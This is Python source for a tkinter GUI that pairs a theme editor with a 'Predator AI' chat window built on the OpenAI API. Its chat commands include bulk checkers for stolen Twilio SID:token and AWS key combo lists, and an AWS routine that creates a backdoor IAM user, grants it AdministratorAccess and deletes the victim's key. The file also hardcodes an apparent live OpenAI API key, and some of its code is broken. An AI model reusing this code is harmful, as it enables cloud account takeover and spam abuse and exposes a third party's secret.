        self.menu = customtkinter.CTkOptionMenu(master=self, fg_color=("white", "gray38"), button_color=("white", "gray38"),
                                         height=30, values=list(self.widgets.items())[0][1], command=self.update)   
        self.menu.grid(row=1, column=0, columnspan=6, sticky="nswe", padx=20)

        self.button_light = customtkinter.CTkButton(master=self, height=100, width=200, corner_radius=10, border_color="white",
                                         text_color="grey50", border_width=2, text="Light", hover=False, command=self.change_color_light)
        self.button_light.grid(row=2, column=0, sticky="nswe", columnspan=3, padx=(20,5), pady=20)
    
        self.button_dark = customtkinter.CTkButton(master=self, height=100, width=200, corner_radius=10, border_color="white",
                                         text_color="gray80", border_width=2, text="Dark", hover=False,
                                         command=self.change_color_dark)
        self.button_dark.grid(row=2, column=3, sticky="nswe", columnspan=3, padx=(5,20), pady=20)

        self.autoload()
        self.button_load = customtkinter.CTkButton(master=self, height=40, width=110, text="Load Theme", command=self.load)
        self.button_load.grid(row=3, column=0,  columnspan=2, sticky="nswe", padx=(20,5), pady=(0,20))

        self.button_export = customtkinter.CTkButton(master=self, height=40, width=110, text="Save Theme", command=self.save)
        self.button_export.grid(row=3, column=2,  columnspan=2, sticky="nswe", padx=(5,5), pady=(0,20))
    
        self.button_reset = customtkinter.CTkButton(master=self, height=40, width=110, text="Reset", command=self.reset)
        self.button_reset.grid(row=3, column=4,  columnspan=2, sticky="nswe", padx=(5,20), pady=(0,20))
        
        # self.palette = customtkinter.CTkButton(master=self, height=40, text="Color Palette", command=self.show_colors)
        # self.palette.grid(row=4, column=0, columnspan=3, sticky="nswe", padx=(20,5), pady=(0,20))
        
        self.update(None)

    #--------------------App Functions--------------------#

    def change_mode_right(self):
        """ changing current widget type wih right button """
        self.widgetlist.append(self.widgetlist.pop(0))
        self.current = self.widgetlist[0]
        self.widget_type.configure(text=self.current)
        self.menu.configure(values=self.widgets[self.current])
        self.menu.set(self.widgets[self.current][0])
        self.update(self.menu.get())
         
    def change_mode_left(self):
        """ changing current widget type with left button  """
        self.widgetlist.insert(0, self.widgetlist.pop())
        self.current = self.widgetlist[0]
        self.widget_type.configure(text=self.current)
        self.menu.configure(values=self.widgets[self.current])
        self.menu.set(self.widgets[self.current][0])
        self.update(self.menu.get())

    def update(self, value):
        """ updating the widgets and their colors """
        for i in self.json_data[self.current]:
            if i==self.menu.get():
                if (self.json_data[self.current][i])[0]!="transparent":
                    self.button_light.configure(fg_color=(self.json_data[self.current][i])[0])
                else:
                    self.button_light.configure(fg_color="transparent")
                if (self.json_data[self.current][i])[1]!="transparent":    
                    self.button_dark.configure(fg_color=(self.json_data[self.current][i])[1])
                else:
                    self.button_dark.configure(fg_color="transparent")
                    
    def change_color_light(self):
        """ choosing the color for Light mode of the theme """
        default = self.button_light._apply_appearance_mode(self.button_light._fg_color)
        if default=="transparent":
            default = "white"
        color1 = askcolor(title="Choose color for "+self.menu.get()+" (Light)",
                          initialcolor=default)
        if color1[1] is not None:
            self.button_light.configure(fg_color=color1[1])
            for i in self.json_data[self.current]:
                if i==self.menu.get():
                    (self.json_data[self.current][i])[0] = color1[1]
               
    def change_color_dark(self):
        """ choosing the color for Dark mode of the theme """
        default = self.button_dark._apply_appearance_mode(self.button_dark._fg_color)
        if default=="transparent":
            default = "white"      
        color2 = askcolor(title="Choose color for "+self.menu.get()+" (Dark)",
                          initialcolor=default)
        if color2[1] is not None:
            self.button_dark.configure(fg_color=color2[1])
            for i in self.json_data[self.current]:
                if i==self.menu.get():
                    (self.json_data[self.current][i])[1] = color2[1]
      
    def save(self):
        # """ exporting the theme file """
        # save_file = tkinter.filedialog.asksaveasfilename(initialfile="Untitled.json", defaultextension=".json",
        #                                                  filetypes=[('json', ['*.json']),('All Files', '*.*')])
        
        save_file = 'theme.json'
        try:
            export_data = copy.deepcopy(self.json_data)
            for i in export_data:
                for j in export_data[i]:
                    if export_data[i][j]==["transparent", "transparent"]:
                        export_data[i][j] = "transparent"
            if save_file:
                with open(save_file, "w") as f:
                    json.dump(export_data, f, indent=2)
                    f.close()
                
                CTkMessagebox(title='Exported!', message='Theme saved successfully!', icon="check", option_1="Close")
                #tkinter.messagebox.showinfo("Exported!","Theme saved successfully!")
        except:
            CTkMessagebox(title='Error!', message='Something went wrong!', icon="cancel")
            #tkinter.messagebox.showerror("Error!","Something went wrong!")
                       
    def autoload(self):
        global json_data

        open_json = 'theme.json'
        try:
            if open_json:
                with open(open_json) as f:
                    self.json_data = json.load(f)
                    
            for i in self.json_data:
                for key, value in self.json_data.get(i).items():
                    if value=="transparent":
                        self.json_data[i][key] = ["transparent", "transparent"]
                        
            self.update(self.menu.get())

        except:
            CTkMessagebox(title='Error!', message='Unable to load "theme.json"', icon="cancel")

    def load(self):
        global json_data
        #open_json = tkinter.filedialog.askopenfilename(filetypes=[('json', ['*.json']),('All Files', '*.*')])
        #open_json = 'theme.json'
        open_json = filedialog.askopenfilename(filetypes=[("json file", ".json")])
        try:
            if open_json:
                with open(open_json) as f:
                    self.json_data = json.load(f)
                    
            for i in self.json_data:
                for key, value in self.json_data.get(i).items():
                    if value=="transparent":
                        self.json_data[i][key] = ["transparent", "transparent"]
                        
            self.update(self.menu.get())
        except:
            CTkMessagebox(title='Error!', message='Unable to load "theme.json"', icon="cancel")
            #customtkinter.messagebox.showerror("Error!","Unable to load this theme file!")
        
    def reset(self):
        """ resetting the current colors of the widget to null (default value) """
        for i in self.json_data[self.current]:
            if i==self.menu.get():
                
                print(f'{self.current}')
                if self.current == 'CTk' or self.current == 'CTkToplevel' or self.current == 'CTkFrame' or self.current == 'CTkOptionMenu':
                    self.json_data[self.current][i][0] = "#ffffff"
                    self.button_light.configure(fg_color="transparent")
                    self.json_data[self.current][i][1] = "black"
                    self.button_dark.configure(fg_color="transparent")
                else:
                    self.json_data[self.current][i][0] = "transparent"
                    self.button_light.configure(fg_color="transparent")
                    self.json_data[self.current][i][1] = "transparent"
                    self.button_dark.configure(fg_color="transparent")
        self.update(self.menu.get())
            
    def replace_color(self, color, button, mode):
        """ replace a specific color """      
        if color=="transparent":
            default = "white"
        else:
            default = color
        new_color = askcolor(title=f"Replace this color: {color}", initialcolor=default)[1]
        if new_color is None:
            new_color = "transparent"
        if mode:
             for i in self.json_data:
                for j in self.json_data[i]:
                    if type(self.json_data[i][j]) is list:
                        if self.json_data[i][j][1]==color:
                            self.json_data[i][j][1] = new_color
                    
        else:
            for i in self.json_data:
                for j in self.json_data[i]:
                    if type(self.json_data[i][j]) is list:
                        if self.json_data[i][j][0]==color:
                            self.json_data[i][j][0] = new_color
        try: button.configure(text=new_color, fg_color=new_color)
        except: pass
        self.update(self.menu.get())
            
    def show_colors(self):
        """ show the color palette for the theme """
        toplevel = customtkinter.CTkToplevel()
        toplevel.resizable(True, True)
        toplevel.geometry("500x700")
        toplevel.title("Color Palette")
        toplevel.transient(self)
        toplevel.grab_set()
        
        frame_light = customtkinter.CTkScrollableFrame(toplevel, label_text="Light Colors")
        frame_light.pack(fill="both", expand=True, side="left", padx=(10,5), pady=10)
        
        frame_dark = customtkinter.CTkScrollableFrame(toplevel, label_text="Dark Colors")
        frame_dark.pack(fill="both", expand=True, side="right", padx=(5,10), pady=10)

        set_dark = set()
        set_light = set()
        
        for i in self.json_data:
            for j in self.json_data[i]:
                if type(self.json_data[i][j]) is list:
                    set_dark.add(self.json_data[i][j][1])
                    set_light.add(self.json_data[i][j][0])
                    
        for color in set_dark:
            button = customtkinter.CTkButton(frame_dark, text=color, fg_color=color)
            button.configure(command=lambda x=color, y=button: self.replace_color(x, y, 1))
            button.pack(fill="x", expand=True, padx=10, pady=5)
            
        for color in set_light:
            button = customtkinter.CTkButton(frame_light, text=color, fg_color=color)
            button.configure(command=lambda x=color, y=button: self.replace_color(x, y, 0))         
            button.pack(fill="x", expand=True, padx=10, pady=5)

class GPTj(customtkinter.CTkToplevel):
    def __init__(self):

        super().__init__()

        ai_icon = customtkinter.CTkImage(light_image=Image.open("core/icons/ai.png"), dark_image=Image.open("core/icons/ai.png"), size=(30, 30))
        usr_icon = customtkinter.CTkImage(light_image=Image.open("core/logo.png"), dark_image=Image.open("core/logo.png"), size=(30, 30))

        def generate_text(prompt, api_key):
            model = "text-davinci-003"
            max_tokens = 400
            temperature = 0.7

            headers = {"Content-Type": "application/json","Authorization": f"Bearer {api_key}"}

            data = {"model": model,"prompt": prompt,"max_tokens": max_tokens,"temperature": temperature}

            response = requests.post("https://api.openai.com/v1/completions", headers=headers, data=json.dumps(data))
            
            if response.status_code == 401:
                return aiRes(prompt, f"401 Unauthorized: The API key is incorrect or invalid.\nYou can obtain an API key from https://platform.openai.com/account/api-keys")
                
            response.raise_for_status()

            result = response.json()
            generated_text = result["choices"][0]["text"].strip()
            return generated_text

        def Ai_Backend(usrMsg):
        
            try:
                self.TestX.set(46)
                api_key = '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'
                generated_text = generate_text(usrMsg, api_key)
                chat = []
                self.TestX.set(93)
                return generated_text 
            except Exception as err:
                console.print_exception(show_locals=True)
                return err

        def aiRes(msg, patch):

            if patch == 0:
                response = Ai_Backend(msg)
            else:
                response = patch
            
            try:
                self.TestX.set(95)
            except:
                pass

            self.BotIconX = customtkinter.CTkLabel(self.chat_frame, text="", image=ai_icon)
            self.BotIconX.pack(padx=1, pady=1)
            self.chat_frame_switches.append(self.BotIconX)

            self.AiMsgX = customtkinter.CTkTextbox(self.chat_frame, corner_radius=10)
            self.AiMsgX.bind("<Button-1>", lambda e:copyfunc(response))
            
            self.AiMsgX.insert("0.0", str(response))
            self.AiMsgX.pack()

            response = str(response)
            
            xlen = len((response))
            if xlen > 1000:
              xwidth = 650
              xheigth = 380

            elif xlen > 850:
              xwidth = 650
              xheigth = 250
            
            elif xlen > 600:
              xwidth = 650
              xheigth = 200

            elif xlen > 500:
              xwidth = 650
              xheigth = 180

            elif xlen > 400:
              xwidth = 650
              xheigth = 170

            elif xlen > 300:
              xwidth = 650
              xheigth = 150

            elif xlen > 200:
              xwidth = 650
              xheigth = 110

            elif xlen > 80:
              xwidth = 650
              xheigth = 80

            elif xlen > 60:
              xwidth = 350
              xheigth = 60

            elif xlen > 40:
              xwidth = 350
              xheigth = 30

            else:
              xwidth = 300
              xheigth = 30

            self.AiMsgX.configure(width=xwidth, height=xheigth)

            self.chat_frame_switches.append(self.AiMsgX)
          
            try:
                self.TestX.set(100)
                self.TestX.destroy()
            except:
                pass

        def ChatEvent():
            usrmsg = self.msg_entry.get()

            self.UsrIconX = customtkinter.CTkLabel(self.chat_frame, text="", image=usr_icon)
            self.UsrIconX.pack()
            self.chat_frame_switches.append(self.UsrIconX)

            # self.UsrMsgX = customtkinter.CTkTextbox(self.chat_frame, fg_color="red", text_color="black", width=600, height=300)
            self.UsrMsgX = customtkinter.CTkTextbox(self.chat_frame, corner_radius=10)
            self.UsrMsgX.bind("<Button-1>", lambda e:copyfunc(usrmsg))
            self.UsrMsgX.insert("0.0", usrmsg)
            self.UsrMsgX.pack()

            self.TestX = customtkinter.CTkProgressBar(self.chat_frame, orientation="horizontal", mode="determinate")
            self.chat_frame_switches.append(self.TestX)
            self.TestX.pack(padx=10, pady=10)
            self.TestX.set(0)

            xlen = len(usrmsg)
            if xlen > 1000:
              xwidth = 650
              xheigth = 380

            elif xlen > 850:
              xwidth = 650
              xheigth = 250
            
            elif xlen > 600:
              xwidth = 650
              xheigth = 200

            elif xlen > 500:
              xwidth = 650
              xheigth = 180

            elif xlen > 400:
              xwidth = 650
              xheigth = 170

            elif xlen > 300:
              xwidth = 650
              xheigth = 150

            elif xlen > 200:
              xwidth = 650
              xheigth = 110

            elif xlen > 80:
              xwidth = 650
              xheigth = 80

            elif xlen > 60:
              xwidth = 350
              xheigth = 60

            elif xlen > 40:
              xwidth = 350
              xheigth = 30

            else:
              xwidth = 300
              xheigth = 30
            
            self.UsrMsgX.configure(width=xwidth, height=xheigth)
          
            self.chat_frame_switches.append(self.UsrMsgX)

            self.TestX.set(6)
            if usrmsg == 'clear' or usrmsg == 'reset' or usrmsg == 'restart':
              
                self.destroy()
                self.TestX.set(100)
                return GPTj() #aiRes(usrmsg, f'{usrmsg} done sir')

            elif usrmsg == 'help' or usrmsg == 'commands':
                self.TestX.set(100)
                return aiRes(usrmsg, '[help, commands] show all available commands\n[clear, reset, restart] restart Predator AI\n[os.h, os -h] show OS Commands\n[aws.c] aws Checker\n[twi.lio]Twilio Balance, Country Checker\n[GhostTrack, g.tr] Useful tool to track location or mobile number\n[ip.l <ip here>] IP address location lookup\n[ip.m] Your IP Informations\n[g.pwd <length>, gen pwd <length>] Generate Strong Password\n[faker] Fake Information Generator\n[hashtype] Hash Type Lookup\n[netx, netxplorer] Network Analysis Tool\n[b.mk, bannerMaker] Create tidy text based banners.')

            elif "twi.lio" in usrmsg:
                def TwilioChecker(sid, token):
                    try:
                        number = ''
                   
                        status = 'OFFLINE'
                        url = 'https://api.twilio.com'
                        check = '/2010-04-01/Accounts.json'
                        response = requests.get(url + check, auth=('{}'.format(sid), '{}'.format(token))).text
                        
                        if '"message":"Authenticat' not in str(response):
                            status = reg('"status": "(.*?)"',response)[0]
                            type = reg('"type": "(.*?)"',response)[0]
                            balancepath = reg('"balance": "(.*?)"',response)[0]
                            response = requests.get(url + balancepath, auth=('{}'.format(sid), '{}'.format(token))).text
                            
                            if '"status":' not in str(response):
                                balance = reg('"balance": "(.*?)"',response)[0]
                                currency = reg('"currency": "(.*?)"',response)[0]
                            
                            if status.lower() == 'active':
                                if number == '':
                                    resx = f'[+] SID : {sid}\n[+] TOKEN : {token}\n[+] TYPE : {type}\n[+] STATUS : {status}\n[+] BALANCE : {balance} {currency}'
                                    consolelog('INFO [TwilioChecker]', resx)

                                    with open('Result/TwilioChecker/result.txt','a',errors='ignore') as f:
                                        f.write(f'{resx}\n<--------------->\n')
                                    
                                    self.ValidTwi += 1
                                    return aiRes(sid, resx)

                                else:
                                    resx = f'[+] SID : {sid}\n[+] TOKEN : {token}\n[+] NUMBER : {number}\n[+] TYPE : {type}\n[+] STATUS : {status}\n[+] BALANCE : {balance} {currency}'
                                    consolelog('INFO [TwilioChecker]', resx)

                                    with open('Result/TwilioChecker/result.txt','a',errors='ignore') as f:
                                        f.write(f'{resx}\n<--------------->\n')
                                    
                                    return aiRes(sid, resx)
                            else:
                                resx = f'[+] SID : {sid}\n[+] TOKEN : {token}\n[+] TYPE : {type}\n[+] STATUS : {status}\n[+] BALANCE : {balance} {currency}'
                                consolelog('INFO [TwilioChecker]', resx)
                                return aiRes(sid, resx)
                        else:
                            resx = f'[+] SID : {sid}\n[+] TOKEN : {token}\n[+] STATUS : {status}'
                            consolelog('INFO [TwilioChecker]', resx)
                            return aiRes(sid, resx)

                    except Exception as err:
                        return aiRes(sid, err)
        
                if "twi.lio " in usrmsg:
                    try:
                        sTarget = usrmsg.replace('twi.lio ', '')

                        if '.txt' in sTarget:
                            combos = open(sTarget, "r").readlines()
                            total = len(combos)

                            aiRes(sTarget, f"Total = {total}")

                            with open(sTarget, 'r', encoding="utf-8") as f:
                                for line in f:
                                    line = line.replace('\n', '')
                                    if line != "":
                                        line = line.replace('\n', '').replace(' ', '').replace('"', '').replace("'", '')
                                        data = line.split(":")

                                        try:
                                            sid = data[0]
                                            tkn = data[1]
                                        except Exception as err:
                                            console.print_exception(show_locals=True)
                                            return aiRes(sTarget, f"{line} > {err}")

                                        resp = TwilioChecker(sid, tkn)
                                        aiRes(sTarget, f"{resp}")

                            return aiRes(sTarget, "Twilio Checker Idle.")

                        else:
                            data = sTarget.split(':')
                            try:
                                sid = data[0]
                                tkn = data[1]
                            except Exception as err:
                                console.print_exception(show_locals=True)
                                return aiRes(sTarget, f"{sTarget} > {err}")

                            resp = TwilioChecker(sid, tkn)
                            return aiRes(sTarget, resp)

                    except Exception as err:
                        return aiRes(usrmsg, err)
                
                else:
                    msg = CTkMessagebox(title=f"Twilio Checker", message="Type?", icon="question", option_1="Cancel", option_2="Single", option_3="Multiple")
                    response = msg.get()

                    if response == "Cancel":
                        return
                
                    elif response == "Single":
                      
                        while True:
                            sTarget = customtkinter.CTkInputDialog(text="Enter: sid:token", title="Twilio Checker").get_input()
                               
                            if ":" in sTarget:
                                break
                            else:
                                if sTarget == "Cancel":break
                          
                            aiRes(sTarget, "Invalid Twilio Format! try: twi.lio AC9f0dc4036baaf84bec7458a4a047352b:a589f5d665ae23b26c3354d8080e5287")

                        if ':' in sTarget:
                            data = sTarget.split(':')
                            try:
                                sid = data[0]
                                tkn = data[1]
                            except Exception as err:
                                console.print_exception(show_locals=True)
                                return aiRes(sTarget, f"{sTarget} > {err}")
            
                        resp = TwilioChecker(sid, tkn)
                        return aiRes(sTarget, resp)

                    elif response == "Multiple":

                        sTarget = filedialog.askopenfilename()
                      
                        combos = open(sTarget, "r").readlines()
                        total = len(combos)

                        self.ValidTwi = 0
                        aiRes(sTarget, f"Total = {total}")

                        with open(sTarget, 'r', encoding="utf-8") as f:
                            for line in f:
                                line = line.replace('\n', '')
                                if line != "":
                                    line = line.replace('\n', '').replace(' ', '').replace('"', '').replace("'", '')
                                    data = line.split(":")

                                    try:
                                        sid = data[0]
                                        tkn = data[1]
                                    except Exception as err:
                                        console.print_exception(show_locals=True)
                                        return aiRes(sTarget, f"{line} > {err}")

                                    resp = TwilioChecker(sid, tkn)
                                    aiRes(sTarget, str(resp))

                        aiRes(sTarget, f"Valid: {self.ValidTwi}")
                        if self.ValidTwi != 0:
                            msg = CTkMessagebox(title=f"Twilio Checker", message="Open Result?", icon="question", option_1="YES", option_2="NO")
                            response = msg.get()

                            if response != "Cancel":
                                Predator.GetResult('','Result/TwilioChecker/result.txt')

                        return aiRes(sTarget, "Twilio Checker Idle")
                           
            elif usrmsg == 'os.h' or usrmsg == 'os -h':
                self.TestX.set(100)
                return aiRes(usrmsg, "[lock os, l.os] locking the device\n[shutdown os, sh.os] shut down\n[empty rb, e.rb] empty/clean Recycle Bin\n[restart os, r.os] restart\n[hibernate os, sleep os, h.os, s.os] Hibernating\n[ch.mac, change mac] MAC Changer,\nUSAGE: ch.mac <your new mac> or just ch.mac (auto gen mac)")
            
            elif usrmsg == 'aws.c':
                self.TestX.set(100)
                return aiRes(usrmsg, f'USAGE: aws.c user:pass:region\nor\naws.c combo.txt')

            elif "aws.c " in usrmsg:

                def getPolicy(mail):
                    try:
                        email = mail[0]
                        password = mail[1]
                        region = mail[2]
                        client = boto3.client('sts', aws_access_key_id=email, aws_secret_access_key=password, region_name = region) 
                        usern = "Adminn"
                        Fkontol = open("Result/AWS/blacklistuser.txt",'r').readlines()
                        response = client.get_access_key_info(AccessKeyId=email)
                        aiRes(usrmsg, response)
                    except:
                      pass
                
                def getUserName(Data):
                    email = data[0]
                    password = data[1]
                    region = data[2]
                    client = boto3.client('iam',aws_access_key_id=email ,aws_secret_access_key=password,region_name = region) 
                    responsex = client.list_users()
                    for xsss in responsex['Users']:
                        fullr = f"{email}:{password}:{region}"
                        aiRes(usrmsg, fullr)
                        UsrNam = xsss['UserName']
                        aiRes(usrmsg, UsrNam)
                        pxc.append(xsss['UserName'])
                        bad_chars = ["Adminn","Admin"]
                        aiRes(usrmsg, pxc)
                    for dis in pxc:
                        dis = dis.replace(bad_chars[0],'')
                        dis = dis.replace(bad_chars[1 ],'')
                        aiRes(usrmsg, dis)
                        remover = str(dis).replace('\r', '')
                        saveblacklist = open("Result/AWS/blacklistuser.txt","a")
                        saveblacklist.write(remover+ '\n\n')
                        saveblacklist.close()
                        blacklist = ""
                        response = client.create_access_key(UserName="titid")

                def AwscHecker(data):
                    regio = ["us-east-2", "us-east-1", "us-west-1", "us-west-2", "ap-east-1", "ap-south-1", "ap-northeast-3", "ap-northeast-2", "ap-southeast-1", "ap-southeast-2", "ap-northeast-1","ca-central-1","cn-north-1","cn-northwest-1","eu-west-1","eu-west-2","eu-west-3","eu-north-1","me-south-1","sa-east-1"]
                    for x in regio:
                        try:
                            email = data[0]
                            password = data[1]
                            region = x
                            client = boto3.client('ses' ,aws_access_key_id=email ,aws_secret_access_key=password ,region_name = region)
                            data = "[O][ACCOUNT]{}|{}|{}".format(email,password,region)
                            aiRes(usrmsg, data)
                            response = client.get_send_quota()
                            aiRes(usrmsg, "[Account Active]")
                            limit =  f"Max Send email 24 Hours: {response['Max24HourSend']} "
                            ddd = client.list_verified_email_addresses()

                            #[Account Active]                           {'VerifiedEmailAddresses': ['HiveHelpdesk@btistudios.com', 'NoReply.HiveHD@btistudios.com', 'Alerts.HiveHD@btistudios.com', 'NoReply.VendorBTI@btistudios.com'], 'ResponseMetadata': {'RequestId': '7c39c498-5d7d-43de-a437-227541468580', 'HTTPStatusCode': 200, 'HTTPHeaders': {'x-amzn-requestid': '7c39c498-5d7d-43de-a437-227541468580', 'content-type': 'text/xml', 'content-length': '577', 'date': 'Sun, 25 Oct 2020 09:35:03 GMT'}, 'RetryAttempts': 0}}
                            getEmailListVer = f"Email Verification from mail:{ddd['VerifiedEmailAddresses']}"
                            # print(getEmailListVer)
                            aiRes(usrmsg, getEmailListVer)
                            response = client.list_identities(IdentityType='EmailAddress', MaxItems=123, NextToken='',)
                        
                            listemail = f"Email: {response['Identities']}"
                            aiRes(usrmsg, listemail)
                            statistic = client.get_send_statistics()
                            getStatistic = f"Email Sent Today Ini:{statistic['SendDataPoints']}"
                            aiRes(usrmsg, getStatistic)
                            xxx = email+"|"+password+"|"+region + "|" +  limit +"|" + listemail
                            aiRes(usrmsg, f"All Data:\n{xxx}")
                            remover = str(xxx).replace('\r', '')
                            simpan = open('Result/AWS/Active.txt', 'a')
                            simpan.write(remover+'\n\n')
                            simpan.close()
                            ValidData = email + ":" + password + ":" + region
                            remover = str(ValidData).replace('\r', '')
                            SimpValid = open('Result/AWS/Create.txt', 'a')
                            SimpValid.write(remover+'\n\n')
                            SimpValid.close()
                            totz  = len(SimpValid)
                            aiRes(usrmsg, f"Total SimpValid: {totz}")
                            response = client.list_users(
                            )
                            aiRes(usrmsg, response)
   
                        except Exception as err:
                            console.print_exception(show_locals=True)
                            aiRes(usrmsg, f'[Account DIE]\n{err}')
                    a
                def CreateAccount(DataValid):
                    try:
                        UsernameLogin = "jSDSgnditikunggobloktolol"
                        user = DataValid[0]
                        keyacces = DataValid[1]
                        regionz = DataValid[2]
                        client = boto3.client('iam',aws_access_key_id=user,aws_secret_access_key=keyacces,region_name = regionz)
                        data = "[O][ACCOUNT]{}|{}|{}".format(user,keyacces,regionz)
                        aiRes(usrmsg, data)
                        Create_user = client.create_user(UserName=UsernameLogin,)
                  

                        aiRes(usrmsg, "succes create iam lets go to dashboard!")
                        bitcg = f"User: {Create_user['User'] ['UserName']}"
                        xxxxcc = f"User: {Create_user['User'] ['Arn']}"
                  
                        aiRes(usrmsg, f"{bitcg}\n{xxxxcc}")
                  
                        #keluan 'Arn': 'arn:aws:iam::320406895696:user/Kontolz'
                        #debug mode create
                        aiRes(usrmsg, Create_user)
                        #set konstanta pws 
                        pws = "admainkontolpaslodsajijsd21334#1ejeg2shehhe"
                
                        aiRes(usrmsg, f"Username = {UsernameLogin}\ncreate acces login for {UsernameLogin}")

                        Buat = client.create_login_profile(Password=pws,PasswordResetRequired=False,UserName=UsernameLogin)
                        aiRes(usrmsg, Buat)
                  
                        #'LoginProfile': {'UserName': 'Kontolz', 'CreateDate':
                        aiRes(usrmsg, f"password: {pws}\ngive access  User to Admin")
                        Admin = client.attach_user_policy(PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess',UserName=UsernameLogin,)
                        xxx = UsernameLogin+"|"+pws+"|"+bitcg + "|" +  xxxxcc
                        aiRes(usrmsg, xxx)
                        remover = str(xxx).replace('\r', '')
                        simpan = open('Result/AWS/IamAccount.txt', 'a')
                        simpan.write(remover+'\n\n')
                        simpan.close()
                        aiRes(usrmsg, Admin)
                        response = client.delete_access_key(AccessKeyId=user)
                        aiRes(usrmsg, f"{response}\nsuccesful your key is privat only now !")
                  
                    except Exception as err:
                        consolelog('INFO', err)

                usrcmd = usrmsg.replace('aws.c ', '')

                if '.txt' in usrcmd:
                    pxc = []
                    combos = open(usrcmd, "r").readlines()
                    total = len(combos)

                    aiRes(usrmsg, f"Total: {total}")

                    arrange = [lines.replace("\n", "")for lines in combos]
                    for lines in arrange:
                        data = lines.split(":")
                        AwscHecker(data)

                    return

                AwscHecker(usrcmd)

            elif usrmsg == 'b.mk' or usrmsg == 'bannerMaker':
              self.TestX.set(100)
              return aiRes(usrmsg, f'USAGE: {usrmsg} <text>')

            elif "b.mk " in usrmsg or "bannerMaker " in usrmsg:
              contents = usrmsg.replace('b.mk ', '').replace('bannerMaker ', '')
              
              def bmaker(contents):
                box_width = 76
                padding = 4
                heading = '*'
              
                text_width = box_width - padding
                heading = f" {heading} "
               
                output_file = 'tmp/banner.txt'
                with open(output_file, 'wt') as outfile:
                  outfile.write(f"{heading.center(box_width, '*')}\n")
                  outfile.write(f"*{' ' * (box_width - 2)}*\n")
                  for line in parawrap.wrap(contents, width=text_width):
                    outfile.write(f"*{line.center(box_width - 2)}*\n")
                  outfile.write(f"*{' ' * (box_width - 2)}*\n")
                  outfile.write(f"{'*' * box_width}\n")
                
                with open('tmp/banner.txt', 'r', encoding="utf-8") as f:
                  resZ = f.read()
                    
                return aiRes(usrmsg, f"Success! The banner has been written to {output_file}")

              try:
                bmaker(contents)
              except Exception as err:
                console.print_exception(show_locals=True)
                return aiRes(usrmsg, err)

            # elif 'atop ' in usrmsg:
            #   usrmsg.replace('atop ', '')
            #   try:
            #     os.environ["PATH"] += usrmsg
            #   except Exception as err:
            #     return aiRes(usrmsg, f"[{usrmsg}] FAILURE: {err}")

            #   return aiRes(usrmsg, f"[{usrmsg}] DONE")

            # elif usrmsg == 'atop':
            #   return aiRes(usrmsg, f"[{usrmsg}] USAGE: atop \"your path\" \nCurrent: {sys.path}")

            elif usrmsg == 'lock os' or usrmsg == "l.os":
              msg = CTkMessagebox(title=f"permission required for [{usrmsg}]", message="are you sure?", icon="question", option_1="Cancel", option_2="No", option_3="Yes")
              response = msg.get()

              if response == "Yes":
                pass

              else:
              
                return

              try:
                ctypes.windll.user32.LockWorkStation()
              except Exception as err:
                console.print_exception(show_locals=True)
                return aiRes(usrmsg, f"[{usrmsg}] FAILURE: {err}")

              return aiRes(usrmsg, f"[{usrmsg}] DONE")

            elif usrmsg == "hibernate os" or usrmsg == "sleep os" or usrmsg == "s.os" or usrmsg == "h.os":
              msg = CTkMessagebox(title=f"permission required for [{usrmsg}]", message="are you sure?",
                        icon="question", option_1="Cancel", option_2="No", option_3="Yes")
              response = msg.get()
              
              if response=="Yes":
                try:
                    subprocess.call("shutdown / h")
                except Exception as err:
                    console.print_exception(show_locals=True)
                    return aiRes(usrmsg, f"[{usrmsg}] FAILURE: {err}")

                return aiRes(usrmsg, f"[{usrmsg}] Done")

            elif usrmsg == 'shutdown os' or usrmsg == 'sh.os':
              msg = CTkMessagebox(title=f"permission required for [{usrmsg}]", message="are you sure?",
                        icon="question", option_1="Cancel", option_2="No", option_3="Yes")
              response = msg.get()
              
              if response=="Yes":
                pass
              else:
                return

              try:
                subprocess.call('shutdown / p /f')
              except Exception as err:
                console.print_exception(show_locals=True)
                return aiRes(usrmsg, f"[{usrmsg}] FAILURE: {err}")
              
              return aiRes(usrmsg, f"[{usrmsg}] DONE")
            
            elif usrmsg == "GhostTrack" or usrmsg == "g.tr":
              optionsX1 = f"[ 1 ] IP Tracker\n[ 2 ] Show Your IP\n[ 3 ] Phone Tracker\n[ 4 ] Username Tracker\n\nUSAGE: GhostTrack <option>"
              return aiRes(usrmsg, optionsX1)

            elif "GhostTrack " in usrmsg or "g.tr " in usrmsg:
              usrop = usrmsg.replace('GhostTrack ', '').replace('g.tr ', '')

              def GhostTrack(input_user):

                if input_user == '1': #OPSI 1         
                  try:
                    def IP_Track():
                      ip = customtkinter.CTkInputDialog(text="Enter IP target", title="GhostTrack").get_input()
                      
                      if ip == "Cancel":return
                      
                      aiRes(usrmsg, f"           ========== LOADIND ==========")
                      req_api = requests.get(f"http://ipwho.is/{ip}") #API IPWHOIS.IS
                      ip_data = json.loads(req_api.text)
                      lat = int(ip_data['latitude'])
                      lon = int(ip_data['longitude'])

                      typex = ip_data['type']
                      country = ip_data['country']
                      country_code = ip_data['country_code']
                      city = ip_data['city']
                      continent = ip_data['continent']
                      continent_code = ip_data['continent_code']
                      region = ip_data['region']
                      region_code = ip_data['region_code']
                      latitude = ip_data['latitude']
                      longitude = ip_data['longitude']
                      is_eu = ip_data['is_eu']
                      postal = ip_data['postal']
                      calling_code = ip_data['calling_code']
                      capital = ip_data['capital']
                      borders = ip_data['borders']
                      flage = ip_data["flag"]["emoji"]
                      coonx = ip_data["connection"]["asn"]
                      orgx = ip_data["connection"]["org"]
                      isp = ip_data["connection"]["isp"]
                      domainx = ip_data["connection"]["domain"]
                      idx = ip_data["timezone"]["id"]
                      abbr = ip_data["timezone"]["abbr"]
                      dst = ip_data["timezone"]["is_dst"]
                      offset = ip_data["timezone"]["offset"]
                      utcx = ip_data["timezone"]["utc"]
                      currtime = ip_data["timezone"]["current_time"]
